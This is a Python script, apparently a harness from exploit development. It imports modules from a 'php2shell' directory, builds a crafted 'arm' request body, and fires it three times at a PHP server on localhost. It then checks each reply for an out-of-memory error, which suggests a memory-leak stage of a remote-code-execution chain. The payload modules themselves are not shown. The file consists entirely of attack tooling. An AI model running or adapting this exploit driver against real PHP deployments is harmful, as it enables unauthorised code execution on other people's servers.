import importlib.util, socket, time
from pathlib import Path

def load(n, p):
    s = importlib.util.spec_from_file_location(n, p)
    m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m

H = Path("/tmp/opencode/realapps/side/php2shell")
L = load("l", H / "native-output-leak.py")
S = load("s", H / "native-output-leak-stock-arm.py")
C = load("c", H / "compact-stock-tail.py")
host, port, path = "127.0.0.1", 28846, "/index.php"
body = S.arm_body(b"abcdefgh", C.ARM_FILENAME_LENGTH)
req = L.request_bytes(f"{host}:{port}", path, body, None, 23, True)

def connect_retry():
    last = None
    for _ in range(6):
        try:
            return socket.create_connection((host, port), timeout=10.0)
        except OSError as e:
            last = e; time.sleep(1.0)
    raise last

def rawRead(sock, deadline=45.0):
    sock.settimeout(5.0); buf = b""; t0 = time.time()
    while time.time() - t0 < deadline:
        try: chunk = sock.recv(65536)
        except socket.timeout: break
        if not chunk: break
        buf += chunk
    return buf

for i in (1, 2, 3):
    try:
        c = connect_retry(); c.settimeout(45.0)
        c.sendall(req); raw = rawRead(c); c.close()
        print(f"R{i}:", raw.split(b"\r\n",1)[0][:22].decode(errors="replace"), "len=", len(raw), "oom=", b"Allowed memory" in raw)
    except Exception as e:
        print(f"R{i}: ERR", str(e)[:80])
